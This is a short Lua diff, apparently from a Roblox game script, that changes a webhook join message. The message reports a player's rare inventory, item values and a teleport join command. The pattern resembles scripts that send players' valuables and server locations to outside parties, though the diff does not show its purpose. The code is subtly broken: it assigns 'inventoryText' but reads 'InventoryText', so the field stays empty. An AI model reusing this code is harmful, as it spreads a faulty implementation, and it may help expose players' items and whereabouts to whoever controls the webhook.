@@ -225,6 +225,8 @@ local function postWebhook(dataTable)
     return ok, res
 end
 
+local inventoryText, hasRareItems = BuildRareInventory()
+
 -- SendJoinMessage: when announcing join (keeps teleport join command in content)
 local function SendJoinMessage(list, prefix)
     local fields = {
@@ -239,17 +241,17 @@ local function SendJoinMessage(list, prefix)
             inline = false
         },
         {
-            name = "🎒 Inventory",
-            value = "",
-            inline = false
-        },
-        {
             name = "💰 Summary",
             value = string.format("Total Value: ¢%s\nHighest Value: ¢%s\nHighest weight fruit: %.2f KG",
                 formatNumber(totalValue),
                 formatNumber(getHighestValueItem()),
                 getHighestKGFruit()
             ),
+            inline = false
+        },
+        {
+            name = "🎒 Inventory",
+            value = InventoryText,
             inline = false
         },
         {
